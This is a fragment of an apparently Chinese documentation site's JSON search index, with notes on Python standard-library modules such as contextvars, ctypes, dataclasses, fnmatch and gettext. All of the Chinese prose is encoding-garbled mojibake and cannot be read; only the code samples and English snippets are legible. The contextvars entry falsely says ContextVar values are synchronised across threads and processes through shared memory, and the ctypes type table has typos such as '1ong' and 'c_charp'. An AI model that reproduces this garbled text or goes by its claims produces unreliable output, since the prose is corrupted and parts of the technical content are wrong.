ç”¨äºç®¡ç†å½“å‰ä¸Šä¸‹æ–‡å’Œå¼‚æ­¥æ¡†æ¶ä¸­ã€‚ åœ¨å¤šå¹¶å‘ç¯å¢ƒä¸­ï¼Œæœ‰çŠ¶æ€ä¸Šä¸‹æ–‡ç®¡ç†å™¨åº”è¯¥ä½¿ç”¨ä¸Šä¸‹æ–‡å˜é‡ï¼Œ è€Œä¸æ˜¯ threading.local() æ¥é˜²æ­¢ä»–ä»¬çš„çŠ¶æ€æ„å¤–æ³„éœ²åˆ°å…¶ä»–ä»£ç  æ³¨è§£ åœ¨å¼‚æ­¥/å¤šå¹¶å‘ç¯å¢ƒä¸­(å¤šè¿›ç¨‹/å¤šçº¿ç¨‹éƒ½å±äºå¤šå¹¶å‘), ContextVar(xxx).get() è·å–çš„å€¼æ˜¯å®æ—¶åŒæ­¥çš„æœ€æ–°çš„ ContextVaré€šè¿‡å…±äº«å†…å­˜çš„æ–¹å¼æä¾›äº†ä¸€ç§æ›´è½»é‡å’ŒPythonicçš„ä¸åŒä»»åŠ¡é—´å…±äº«çŠ¶æ€çš„æœºåˆ¶. ä½†ä¸é€‚åˆä¸åŒè¿›ç¨‹é—´é€šä¿¡; å¦‚æœéœ€è¦è·¨è¿›ç¨‹,è¿˜æ˜¯æ›´å»ºè®®ä½¿ç”¨ from multiprocessing import Manager å¸¸ç”¨æœ‰ContextVar ContextVar-ç”¨ä¾‹ code: CONTEXT_EXAMPLE = ContextVar('context-example', default=list())","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-contextvars.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-contextvars.html"},{"title":"ctypes","text":"å¸¸ç”¨äºåŠ è½½C(++)æ¨¡å— Cä¸Pythonä¸ctypesç±»å‹ C Type Python Type ctypes Type char 1-character string c_char wchar_t 1-character Unicode string c_wchar char int/long c_byte char int/long c_ubyte short int/long c_short unsigned short int/long c_ushort int int/long c_int unsigned int int/long c_uint 1ong int/long c_long unsigned long int/long c_ulong long long int/long c_longlong unsigned long long int/long c_ulonglong float float c float double float c_double char * (NULL terminated) string or none c_charp wchar_t * (NULL terminated) unicode or none c_wchar_p void * int/long or none c_void_P æœç´¢åº“ æ¨¡ç³Šæœç´¢æœ¬åœ°å­˜åœ¨çš„åº“: In [2]: from ctypes.util import find_library In [3]: find_library('SensApi') # æœ¬åœ°æ²¡æœ‰ In [4]: find_library('pthread') Out[4]: '/usr/lib/libpthread.dylib' åŠ è½½ åŠ è½½dll, å¦‚Windowsä¸‹å­˜åœ¨ SensApi.dll , è¯•åŠ è½½: In [5]: import ctypes In [6]: ctypes.cdll.LoadLibrary('SensApi') --------------------------------------------------------------------------- OSError Traceback (most recent call last) Cell In [6], line 1 ----> 1 ctypes.cdll.LoadLibrary('SensApi') File /usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/ctypes/__init__.py:452, in LibraryLoader.LoadLibrary(self, name) 451 def LoadLibrary(self, name): --> 452 return self._dlltype(name) File /usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/ctypes/__init__.py:374, in CDLL.__init__(self, name, mode, handle, use_errno, use_last_error, winmode) 371 self._FuncPtr = _FuncPtr 373 if handle is None: --> 374 self._handle = _dlopen(self._name, mode) 375 else: 376 self._handle = handle OSError: dlopen(SensApi, 0x0006): tried: 'SensApi' (no such file), '/System/Volumes/Preboot/Cryptexes/OSSensApi' (no such file), '/usr/local/lib/SensApi' (no such file), '/System/Volumes/Preboot/Cryptexes/OS/usr/local/lib/SensApi' (no such file), '/usr/local/lib/SensApi' (no such file), '/System/Volumes/Preboot/Cryptexes/OS/usr/local/lib/SensApi' (no such file), '/usr/lib/SensApi' (no such file, not in dyld cache), 'SensApi' (no such file), '/usr/local/lib/SensApi' (no such file), '/usr/lib/SensApi' (no such file, not in dyld cache) In [7]: ctypes.cdll.LoadLibrary('libpthread.dylib') Out[7]: <CDLL 'libpthread.dylib', handle 485a6f120 at 0x107bac220> In [8]: ctypes.cdll.LoadLibrary('/usr/lib/libpthread.dylib') Out[8]: <CDLL '/usr/lib/libpthread.dylib', handle 485a6f120 at 0x1081f3a60> In [9]: å¯ä»¥çœ‹å‡º, è‹¥åªç»™ä¸€ä¸ªæ¨¡ç³Šè·¯å¾„, ä¼šåœ¨ç¯å¢ƒå˜é‡ä¸‹æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨, ä¸å­˜åœ¨å°±æŠ¥é”™. è‹¥å­˜åœ¨, ç”¨ç»å¯¹è·¯å¾„è¿˜æ˜¯ç›¸å¯¹è·¯å¾„åŠ è½½å·®è·ä¸å¤§(é™¤éåœ¨å¤šä¸ªç¯å¢ƒå˜é‡ä¸‹åŒ…å«åŒååº“çš„ä¸åŒå®ç°). å®šä¹‰ç»“æ„ä½“ Cçº§åˆ«: /* A C data structure */ typedef struct Point { double x,y; } Point; Pythonçº§åˆ«, ä»¥ç±»çš„å½¢å¼å®šä¹‰, _fields_ å®šä¹‰å…¶å†…å˜é‡: import ctypes # struct Point { } class Point(ctypes.Structure): _fields_ = [ ('x', ctypes.c_double), ('y', ctypes.c_double)] è®¿é—®Cçº§åˆ«å‡½æ•° æ³¨: æ­¤å¤„çš„ Point å·²åœ¨ä¸Šå®šä¹‰. Cå‡½æ•°: /* Function involving a C data structure */ double distance(Point *p1, Point *p2) { return hypot(p1->x - p2->x, p1->y - p2->y); } PythonåŠ è½½: # _mod = ctypes.cdll.LoadLibrary(_path) # double distance(Point *, Point *) distance = _mod.distance distance.argtypes = (ctypes.POINTER(Point), ctypes.POINTER(Point)) distance.restype = ctypes.c_double ä½¿ç”¨åŠ¨æ€åº“ ç¤ºä¾‹-ä½¿ç”¨åŠ¨æ€åº“libcæ‰“å°è¾“å‡º: # ç³»ç»Ÿ: Mac from ctypes import CDLL, c_char_p from ctypes.util import find_library def do_c_print(data: str): # libc = CDLL(\"/Library/Developer/CommandLineTools/usr/lib/libclang.dylib\") libc = CDLL(\"libc.dylib\") lib_path = find_library(\"libc.dylib\") # æ­£ç¡®è¾“å‡º libc.printf(b\"do_c_print0: %s\\n\", c_char_p(bytes(data, 'utf8'))) libc.printf(b\"do_c_print1: %s\\n\", bytes(data, 'utf8')) libc.printf(b\"do_c_print1: %s\\nlib path: %s\\n\", bytes(data, 'utf8'), bytes(lib_path, 'utf8')) # ä¸è¡Œ, å¿…é¡»è½¬æ¢ä¸ºå­—èŠ‚ libc.printf(\"do_c_print: %s\\n\\n\", data) if __name__ == '__main__': do_c_print(\"it is a c print message\") å¯èƒ½æ˜¯Cé‚£è¾¹æ˜¯å­—èŠ‚å¤„ç†çš„åŸå› , æ‰€ä»¥è°ƒç”¨çš„æ—¶å€™, Pythonçš„Unicodeé£æ ¼å­—ç¬¦ä¸² å¿…é¡» è½¬æ¢ä¸ºå­—èŠ‚ æ‰èƒ½è¢«æ­£å¸¸è°ƒç”¨. å¦å¤–, find_library å¥½åƒæ‰¾è·¯å¾„æœ‰ç‚¹é—®é¢˜, æ‰“å°å‡ºæ¥çš„ç»“æœæ˜¯: /usr/lib/libc.dylib ä½†æ˜¯å®é™…ç³»ç»Ÿæ‰¾ä¸åˆ°: $ ls /usr/lib/libc.dylib ls: /usr/lib/libc.dylib: No such file or directory æ³¨è§£ argtypes ç»‘å®šå½¢å‚åˆ—è¡¨ç±»å‹ restype ç»‘å®šå‡½æ•°è¿”å›ç±»å‹ æ³¨æ„ç±»å‹ç­¾åç»‘å®šæ˜¯æ¯”è¾ƒé‡è¦çš„, å¦åˆ™å¯èƒ½ä»£ç ä¸èƒ½æ­£å¸¸è¿è¡Œ, ç”šè‡³å¯¼è‡´æ•´ä¸ªPythonè§£é‡Šå™¨æŒ‚æ‰, æ•…å»ºè®®è¿›è¡Œç­¾åç»‘å®š.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-ctypes.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-ctypes.html"},{"title":"dataclasses","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/dataclasses.html æä¾›äº†ä¸€ä¸ªè£…é¥°å™¨å’Œä¸€äº›å‡½æ•°ï¼Œç”¨äºè‡ªåŠ¨æ·»åŠ ç”Ÿæˆçš„ special methodï¼Œä¾‹å¦‚ __init__() å’Œ __repr__() åˆ°ç”¨æˆ·å®šä¹‰çš„ç±»ã€‚ è£…é¥°å™¨ä½¿ç”¨ ç±»å±æ€§çš„é»˜è®¤å€¼ å¦‚æœé€šè¿‡è°ƒç”¨ field() æŒ‡å®šå­—æ®µçš„é»˜è®¤å€¼ï¼Œåˆ™è¯¥å­—æ®µçš„ç±»å±æ€§å°†æ›¿æ¢ä¸ºæŒ‡å®šçš„ default å€¼ã€‚ å¦‚æœæ²¡æœ‰æä¾› default ï¼Œé‚£ä¹ˆå°†åˆ é™¤ç±»å±æ€§ã€‚ç›®çš„æ˜¯åœ¨ dataclass() è£…é¥°å™¨è¿è¡Œä¹‹åï¼Œç±»å±æ€§å°†åŒ…å«å­—æ®µçš„é»˜è®¤å€¼ï¼Œå°±åƒæŒ‡å®šäº†é»˜è®¤å€¼ä¸€æ ·ã€‚ ä¾‹å¦‚: @dataclass class C: x: int y: int = field(repr=False) z: int = field(repr=False, default=10) t: int = 20 ç±»å±æ€§ C.z å°†æ˜¯ 10 ï¼Œç±»å±æ€§ C.t å°†æ˜¯ 20ï¼Œç±»å±æ€§ C.x å’Œ C.y å°†ä¸è®¾ç½®(å› ä¸º æ²¡è®¾ç½®é»˜è®¤å€¼ )ã€‚ Field å¯¹è±¡æè¿°æ¯ä¸ªå®šä¹‰çš„å­—æ®µã€‚è¿™äº›å¯¹è±¡åœ¨å†…éƒ¨åˆ›å»ºï¼Œå¹¶ç”± fields() æ¨¡å—çº§æ–¹æ³•è¿”å›ï¼ˆè§ä¸‹æ–‡ï¼‰ã€‚ç”¨æˆ·æ°¸è¿œä¸åº”è¯¥ç›´æ¥å®ä¾‹åŒ– Field å¯¹è±¡ã€‚ å…¶æœ‰æ–‡æ¡£çš„å±æ€§æ˜¯ï¼š name ï¼šå­—æ®µçš„åå­—ã€‚ type ï¼šå­—æ®µçš„ç±»å‹ã€‚ default, default_factory, init, repr, hash, compare, metadata å’Œ kw_only å…·æœ‰ä¸ field() å‡½æ•°ä¸­å¯¹åº”å‚æ•°ç›¸åŒçš„å«ä¹‰å’Œå€¼ã€‚ å¯èƒ½å­˜åœ¨å…¶ä»–å±æ€§ï¼Œä½†å®ƒä»¬æ˜¯ç§æœ‰çš„ï¼Œä¸èƒ½è¢«å®¡æŸ¥æˆ–ä¾èµ–ã€‚ æ³¨è§£ ä½¿ç”¨ @dataclasses æ—¶, __init__() æ–¹æ³•å°†ä¼šè°ƒç”¨ __post_init__() æ–¹æ³• ä¸”å…·æœ‰ç»§æ‰¿å…³ç³»çš„ç±»æ—¶, __init__() ä¸ä¼šå®ç°åŸºç±»çš„ __init__(), æ•…æœ‰éœ€æ±‚å¯ä»¥åœ¨ __post_init__() é‡Œè°ƒç”¨ å…·æœ‰ç»§æ‰¿å…³ç³»æ—¶, å‚æ•°ä¸ºå…¶å˜é‡å£°æ˜é¡ºåº(å˜é‡ç±»å‹é»˜è®¤å€¼ä¼šè¢«è¦†ç›–). å…³é”®å­—å­—æ®µå…·æœ‰é‡æ–°æ’åº: å…ˆé¡ºåºæ™®é€šå­—æ®µ, å†é¡ºåºå…³é”®å­—å­—æ®µ. ç±»å±æ€§ dataclasses.MISSING ä¸€ä¸ªè¡¨ç¤ºç¼ºå¤± default æˆ– default_factory çš„ç›‘è§†å€¼ã€‚ dataclasses.KW_ONLY ä¸€ä¸ªç”¨ä½œç±»å‹æ ‡æ³¨çš„ç›‘è§†å€¼ã€‚ ä»»ä½•åœ¨ä¼ªå­—æ®µä¹‹åçš„ç±»å‹ä¸º KW_ONLY çš„å­—æ®µä¼šè¢«æ ‡è®°ä¸ºä»…é™å…³é”®å­—å­—æ®µã€‚ è¯·æ³¨æ„åœ¨å…¶ä»–æƒ…å†µä¸‹ KW_ONLY ç±»å‹çš„ä¼ªå­—æ®µä¼šè¢«å®Œå…¨å¿½ç•¥ã€‚ è¿™åŒ…æ‹¬æ­¤ç±»å­—æ®µçš„åç§°ã€‚ æ ¹æ®æƒ¯ä¾‹ï¼Œåç§° _ ä¼šè¢«ç”¨ä½œ KW_ONLY å­—æ®µã€‚ ä»…é™å…³é”®å­—å­—æ®µæŒ‡æ˜å½“ç±»è¢«å®ä¾‹åŒ–æ—¶ __init__() å½¢å‚å¿…é¡»ä»¥å…³é”®å­—å½¢å¼æ¥æŒ‡å®šã€‚ å¯ç”¨äº å…³é”®å­—å­—æ®µé‡æ’åº . åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå­—æ®µ y å’Œ z å°†è¢«æ ‡è®°ä¸ºä»…é™å…³é”®å­—å­—æ®µ: @dataclass class Point: x: float _: KW_ONLY y: float z: float p = Point(0, y=1.5, z=2.0) åœ¨å•ä¸ªæ•°æ®ç±»ä¸­ï¼ŒæŒ‡å®šä¸€ä¸ªä»¥ä¸Š KW_ONLY ç±»å‹çš„å­—æ®µå°†å¯¼è‡´é”™è¯¯ã€‚ ç»§æ‰¿æ—¶é¡ºåº ç»§æ‰¿æ—¶, é¡ºåºæŒ‰ç…§å®šä¹‰é¡ºåº, ä½†æ˜¯ç±»å‹ä¼šè¢«è¦†ç›–(Pythonç»§æ‰¿MROæœºåˆ¶): @dataclass class Base: x: Any = 15.0 y: int = 0 @dataclass class C(Base): z: int = 10 x: int = 15 æœ€åçš„å­—æ®µåˆ—è¡¨ä¾æ¬¡æ˜¯ x ã€ y ã€ z ã€‚ x çš„æœ€ç»ˆç±»å‹æ˜¯ int ï¼Œå¦‚ç±» C ä¸­æ‰€æŒ‡å®šçš„é‚£æ ·ã€‚ ç±»ä¼¼: def __init__(self, x: int = 15, y: int = 0, z: int = 10): ... å…³é”®å­—å­—æ®µé‡æ’åº ä»…é™å…³é”®å­—å­—æ®µçš„é‡æ–°æ’åº-ä½¿ç”¨ KW_ONLY åœ¨è®¡ç®—å‡º __init__() æ‰€éœ€è¦çš„å½¢å‚ä¹‹åï¼Œä»»ä½•ä»…é™å…³é”®å­—å½¢å‚ä¼šè¢«ç§»è‡³æ‰€æœ‰å¸¸è§„ï¼ˆéä»…é™å…³é”®å­—ï¼‰å½¢å‚çš„åé¢ã€‚ è¿™æ˜¯ Python ä¸­å®ç°ä»…é™å…³é”®å­—å½¢å‚æ‰€è¦æ±‚çš„ï¼šå®ƒä»¬å¿…é¡»ä½äºéä»…é™å…³é”®å­—å½¢å‚ä¹‹åã€‚ åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒBase.y, Base.w, and D.t æ˜¯ä»…é™å…³é”®å­—å­—æ®µï¼Œè€Œ Base.x å’Œ D.z æ˜¯å¸¸è§„å­—æ®µ: @dataclass class Base: x: Any = 15.0 _: KW_ONLY y: int = 0 w: int = 1 @dataclass class D(Base): z: int = 10 # æ³¨æ„è¿™é‡Œä¹Ÿæœ‰ kw_only å‚æ•° t: int = field(kw_only=True, default=0) ç»“æœè¿‘ä¼¼: def __init__(self, x: Any = 15.0, z: int = 10, *, y: int = 0, w: int = 1, t: int = 0): ...","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-dataclasses.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-dataclasses.html"},{"title":"datetime","text":"ä¸ /docs/åç«¯/python/pythonæ ‡å‡†åº“/time ç±»ä¼¼, åŒºåˆ«å¦‚ä¸‹ time: æä¾›äº†ä¸æ—¶é—´æœ‰å…³çš„å‡½æ•°å’Œç±»å‹ï¼ŒåŒ…æ‹¬è·å–å½“å‰æ—¶é—´ã€å°†æ—¶é—´æˆ³è½¬æ¢ä¸ºäººç±»å¯è¯»æ ¼å¼ç­‰ datetime: æä¾›äº†æ›´çµæ´»å’Œå¼ºå¤§çš„æ—¥æœŸå’Œæ—¶é—´æ“ä½œåŠŸèƒ½ï¼ŒåŒ…æ‹¬æ—¥æœŸç®—æœ¯ã€æ—¥æœŸæ ¼å¼åŒ–ç­‰ã€‚ ç¤ºä¾‹: import datetime # è·å–å½“å‰æ—¥æœŸå’Œæ—¶é—´ now = datetime.datetime.now() print(now) # æ ¼å¼åŒ–æ—¥æœŸå­—ç¬¦ä¸² date_str = now.strftime('%Y-%m-%d %H:%M:%S') print(date_str)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-datetime.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-datetime.html"},{"title":"decimal","text":"","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-decimal.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-decimal.html"},{"title":"dis","text":"å®˜ç½‘: dis --- Python å­—èŠ‚ç åæ±‡ç¼–å™¨ é€šè¿‡åæ±‡ç¼–æ”¯æŒCPythonçš„ bytecode åˆ†æã€‚ è¯¥æ¨¡å—ä½œä¸ºè¾“å…¥çš„ CPython å­—èŠ‚ç åœ¨æ–‡ä»¶ Include/opcode.h ä¸­å®šä¹‰ï¼Œå¹¶ç”±ç¼–è¯‘å™¨å’Œè§£é‡Šå™¨ä½¿ç”¨ã€‚ CPython å®ç°ç»†èŠ‚ï¼š å­—èŠ‚ç æ˜¯ CPython è§£é‡Šå™¨çš„å®ç°ç»†èŠ‚ã€‚ ä¸ä¿è¯ä¸ä¼šåœ¨Pythonç‰ˆæœ¬ä¹‹é—´æ·»åŠ ã€åˆ é™¤æˆ–æ›´æ”¹å­—èŠ‚ç ã€‚ä¸åº”è€ƒè™‘å°†æ­¤æ¨¡å—çš„è·¨ Python VM æˆ– Python ç‰ˆæœ¬çš„ä½¿ç”¨ã€‚ ç¤ºä¾‹ï¼šç»™å‡ºå‡½æ•° myfunc(): def myfunc(alist): return len(alist) the following command can be used to display the disassembly of myfunc(): >>> dis.dis(myfunc) 2 0 RESUME 0 3 2 LOAD_GLOBAL 1 (NULL + len) 14 LOAD_FAST 0 (alist) 16 PRECALL 1 20 CALL 1 30 RETURN_VALUE","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-dis.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-dis.html"},{"title":"fileinput","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/fileinput.html è¿­ä»£æ¥è‡ªå¤šä¸ªè¾“å…¥æµçš„è¡Œ æ­¤æ¨¡å—å®ç°äº†ä¸€ä¸ªè¾…åŠ©ç±»å’Œä¸€äº›å‡½æ•°ç”¨æ¥å¿«é€Ÿç¼–å†™è®¿é—®æ ‡å‡†è¾“å…¥æˆ–æ–‡ä»¶åˆ—è¡¨çš„å¾ªç¯ã€‚ å¦‚æœä½ åªæƒ³è¦è¯»å†™ä¸€ä¸ªæ–‡ä»¶è¯·å‚é˜… open()ã€‚ å…¸å‹ç”¨æ³•ä¸º: import fileinput for line in fileinput.input(encoding=\"utf-8\"): process(line) æ­¤ç¨‹åºä¼šè¿­ä»£ sys.argv[1:] ä¸­åˆ—å‡ºçš„æ‰€æœ‰æ–‡ä»¶å†…çš„è¡Œï¼Œå¦‚æœåˆ—è¡¨ä¸ºç©ºåˆ™ä¼šä½¿ç”¨ sys.stdinã€‚ å¦‚æœæœ‰ä¸€ä¸ªæ–‡ä»¶åä¸º '-'ï¼Œå®ƒä¹Ÿä¼šè¢«æ›¿æ¢ä¸º sys.stdin å¹¶ä¸”å¯é€‰å‚æ•° mode å’Œ openhook ä¼šè¢«å¿½ç•¥ã€‚ è¦æŒ‡å®šæ›¿ä»£æ–‡ä»¶åˆ—è¡¨ï¼Œè¯·å°†å…¶ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ ç»™ input()ã€‚ ä¹Ÿå…è®¸ä½¿ç”¨å•ä¸ªæ–‡ä»¶ã€‚ æ‰€æœ‰æ–‡ä»¶éƒ½é»˜è®¤ä»¥æ–‡æœ¬æ¨¡å¼æ‰“å¼€ï¼Œä½†ä½ å¯ä»¥é€šè¿‡åœ¨è°ƒç”¨ input() æˆ– FileInput æ—¶æŒ‡å®š mode å½¢å‚æ¥é‡è½½æ­¤è¡Œä¸ºã€‚ å¦‚æœåœ¨æ‰“å¼€æˆ–è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿäº† I/O é”™è¯¯ï¼Œå°†ä¼šå¼•å‘ OSErrorã€‚ åœ¨ 3.3 ç‰ˆæ›´æ”¹: åŸæ¥ä¼šå¼•å‘ IOErrorï¼›ç°åœ¨å®ƒæ˜¯ OSError çš„åˆ«åã€‚ å¦‚æœ sys.stdin è¢«ä½¿ç”¨è¶…è¿‡ä¸€æ¬¡ï¼Œåˆ™ç¬¬äºŒæ¬¡ä¹‹åçš„ä½¿ç”¨å°†ä¸è¿”å›ä»»ä½•è¡Œï¼Œ é™¤éæ˜¯è¢«äº¤äº’å¼çš„ä½¿ç”¨ï¼Œæˆ–éƒ½æ˜¯è¢«æ˜¾å¼åœ°é‡ç½® (ä¾‹å¦‚ä½¿ç”¨ sys.stdin.seek(0))ã€‚ ç©ºæ–‡ä»¶æ‰“å¼€åå°†ç«‹å³è¢«å…³é—­ï¼›å®ƒä»¬åœ¨æ–‡ä»¶åˆ—è¡¨ä¸­ä¼šè¢«æ³¨æ„åˆ°çš„å”¯ä¸€æƒ…å†µåªæœ‰å½“æœ€åæ‰“å¼€çš„æ–‡ä»¶ä¸ºç©ºçš„æ—¶å€™ã€‚ åå›çš„è¡Œä¸ä¼šå¯¹æ¢è¡Œç¬¦åšä»»ä½•å¤„ç†ï¼Œè¿™æ„å‘³ç€æ–‡ä»¶ä¸­çš„æœ€åä¸€è¡Œå¯èƒ½ä¸å¸¦æ¢è¡Œç¬¦ã€‚ ä½ å¯ä»¥é€šè¿‡å°† openhook å½¢å‚ä¼ ç»™ fileinput.input() æˆ– FileInput() æ¥æä¾›ä¸€ä¸ªæ‰“å¼€é’©å­ä»¥ä¾¿æ§åˆ¶æ–‡ä»¶çš„æ‰“å¼€æ–¹å¼ã€‚ æ­¤é’©å­å¿…é¡»ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œå®ƒæ¥å—ä¸¤ä¸ªå‚æ•° filename å’Œ modeï¼Œå¹¶è¿”å›ä¸€ä¸ªä»¥ç›¸åº”æ¨¡å¼æ‰“å¼€çš„æ–‡ä»¶ç±»å¯¹è±¡ã€‚ å¦‚æœæŒ‡å®šäº† encoding å’Œ/æˆ– errorsï¼Œå®ƒä»¬å°†ä½œä¸ºé¢å¤–çš„å…³é”®å­—å‚æ•°è¢«ä¼ ç»™è¿™ä¸ªé’©å­ã€‚ æ­¤æ¨¡å—æä¾›äº†ä¸€ä¸ª hook_compressed() æ¥æ”¯æŒå‹ç¼©æ–‡ä»¶ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-fileinput.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-fileinput.html"},{"title":"fnmatchæ¨¡å—","text":"ä»‹äºæ™®é€šå­—ç¬¦ä¸²ä¸ /docs/åç«¯/python/pythonæ ‡å‡†åº“/re ä¹‹é—´çš„å­—ç¬¦ä¸²æ“ä½œæ¨¡å— fnmatch æ¨¡å—æä¾›äº†ä¸¤ä¸ªå‡½æ•°â€”â€”fnmatch() å’Œ fnmatchcase() ï¼Œå¯ä»¥ç”¨æ¥å®ç° è¿™æ ·çš„åŒ¹é…ã€‚ç”¨æ³•å¦‚ä¸‹: if any(name.endswith(('.c', '.h')) for name in listdir(dirname)): ... >>> from fnmatch import fnmatch, fnmatchcase >>> fnmatch('foo.txt', '*.txt') True >>> fnmatch('foo.txt', '?oo.txt') True >>> fnmatch('Dat45.csv', 'Dat[0-9]*') True >>> names = ['Dat1.csv', 'Dat2.csv', 'config.ini', 'foo.py'] >>> [name for name in names if fnmatch(name, 'Dat*.csv')] ['Dat1.csv', 'Dat2.csv'] >>> fnmatch() å‡½æ•°ä½¿ç”¨åº•å±‚æ“ä½œç³»ç»Ÿçš„å¤§å°å†™æ•æ„Ÿè§„åˆ™ (ä¸åŒçš„ç³»ç»Ÿæ˜¯ä¸ä¸€æ ·çš„) æ¥ åŒ¹é…æ¨¡å¼ã€‚æ¯”å¦‚: >>> # On OS X (Mac) >>> fnmatch('foo.txt', '*.TXT') False >>> # On Windows >>> fnmatch('foo.txt', '*.TXT') True >>> å¯ä»¥ä½¿ç”¨ fnmatchcase() æ¥ä»£æ›¿ã€‚å®ƒå®Œå…¨ä½¿ç”¨ä½ çš„æ¨¡ å¼å¤§å°å†™åŒ¹é…ã€‚æ¯”å¦‚: >>> fnmatchcase('foo.txt', '*.TXT') False >>> fnmatch ä½¿ç”¨åº•å±‚æ“ä½œç³»ç»Ÿçš„å¤§å°å†™æ•æ„Ÿè§„åˆ™ (ä¸åŒçš„ç³»ç»Ÿæ˜¯ä¸ä¸€æ ·çš„) æ¥ åŒ¹é…æ¨¡å¼: >>> # On OS X (Mac) >>> fnmatch('foo.txt', '*.TXT') False >>> # On Windows >>> fnmatch('foo.txt', '*.TXT') True >>> fnmatchcase","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-fnmatch.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-fnmatch.html"},{"title":"fractions","text":"æ”¯æŒåˆ†æ•°è¿ç®—, å¦‚: >>> from fractions import Fraction >>> a = Fraction(5, 4) >>> b = Fraction(7, 16) >>> print(a + b) 27/16 >>> # Getting numerator/denominator >>> c = a * b >>> c.numerator 35 >>> c.denominator 64","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-frames.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-frames.html"},{"title":"gettextæ¨¡å—","text":"å®˜ç½‘æ–‡æ¡£:: gettext å¤šè¯­ç§å›½é™…åŒ–æœåŠ¡ ä¸º Python æ¨¡å—å’Œåº”ç”¨ç¨‹åºæä¾›å›½é™…åŒ– (Internationalization, I18N) å’Œæœ¬åœ°åŒ– (Localization, L10N) æœåŠ¡. æ”¯æŒ GNU gettext æ¶ˆæ¯ç¼–ç›® API. GUN_gettext_API æ”¯æŒ é«˜çº§çš„ã€åŸºäºç±»çš„ API. å¯èƒ½æ›´é€‚åˆäº Python æ–‡ä»¶ GNU gettext API ä½¿ç”¨è¯¥ APIï¼Œå°†ä¼šå¯¹æ•´ä¸ªåº”ç”¨ç¨‹åºäº§ç”Ÿå…¨å±€çš„å½±å“ã€‚ å¦‚æœä½ çš„åº”ç”¨ç¨‹åºæ”¯æŒå¤šè¯­ç§ï¼Œè€Œè¯­è¨€é€‰æ‹©å–å†³äºç”¨æˆ·çš„è¯­è¨€ç¯å¢ƒè®¾ç½®ï¼Œè¿™é€šå¸¸æ­£æ˜¯ä½ æ‰€æƒ³è¦çš„ã€‚ è€Œå¦‚æœä½ æ­£åœ¨æœ¬åœ°åŒ–æŸä¸ª Python æ¨¡å—ï¼Œæˆ–è€…ä½ çš„åº”ç”¨ç¨‹åºéœ€è¦åœ¨è¿è¡Œæ—¶åˆ‡æ¢è¯­è¨€ï¼Œç›¸åä½ æˆ–è®¸æƒ³ç”¨åŸºäºç±»çš„API: api_base_class ã€‚ API: bindtextdomain textdomain gettext dgettext ngettext dngettext pgettext dpgettext npgettext dnpgettext bindtextdomain textdomain gettext dgettext ngettext dngettext pgettext dpgettext npgettext dnpgettext æ³¨æ„ï¼ŒGNU gettext è¿˜å®šä¹‰äº† dcgettext() æ–¹æ³•ï¼Œä½†å®ƒè¢«è®¤ä¸ºä¸å®ç”¨ï¼Œå› æ­¤ç›®å‰æ²¡æœ‰å®ç°å®ƒã€‚ è¿™æ˜¯è¯¥ API çš„å…¸å‹ç”¨æ³•ç¤ºä¾‹: import gettext gettext.bindtextdomain('myapplication', '/path/to/my/language/directory') gettext.textdomain('myapplication') _ = gettext.gettext # ... print(_('This is a translatable string.')) åŸºäºç±»çš„ API ä¸ GNU gettext API ( GUN_gettext_API ) ç›¸æ¯”ï¼Œgettext æ¨¡å—çš„åŸºäºç±»çš„ API æä¾›äº†æ›´å¤šçš„çµæ´»æ€§å’Œæ›´å¼ºçš„ä¾¿åˆ©æ€§ã€‚ è¿™æ˜¯æœ¬åœ°åŒ– Python åº”ç”¨ç¨‹åºå’Œæ¨¡å—çš„æ¨èæ–¹æ³•ã€‚ gettext å®šä¹‰äº†ä¸€ä¸ª GNUTranslations ç±»ï¼Œè¯¥ç±»å®ç°äº† GNU .mo æ ¼å¼æ–‡ä»¶çš„è§£æï¼Œå¹¶ä¸”å…·æœ‰ç”¨äºè¿”å›å­—ç¬¦ä¸²çš„æ–¹æ³•ã€‚ æœ¬ç±»çš„å®ä¾‹ä¹Ÿå¯ä»¥å°†è‡ªèº«ä½œä¸ºå‡½æ•° _() å®‰è£…åˆ°å†…å»ºå‘½åç©ºé—´ä¸­ã€‚ API: find translation install find translation install æœ¬åœ°åŒ– éƒ¨åˆ†æœ¬åœ°åŒ–: import gettext t = gettext.translation('spam', '/usr/share/locale') _ = t.gettext å…¨å±€æœ¬åœ°åŒ–: import gettext lang1 = gettext.translation('myapplication', languages=['en']) lang2 = gettext.translation('myapplication', languages=['fr']) lang3 = gettext.translation('myapplication', languages=['de']) # start by using language1 lang1.install() # ... time goes by, user selects language 2 lang2.install() # ... more time goes by, user selects language 3 lang3.install() [1] ä¸åŒç³»ç»Ÿçš„é»˜è®¤è¯­è¨€ç¯å¢ƒç›®å½•æ˜¯ä¸åŒçš„ï¼› æ¯”å¦‚åœ¨ RedHat Linux 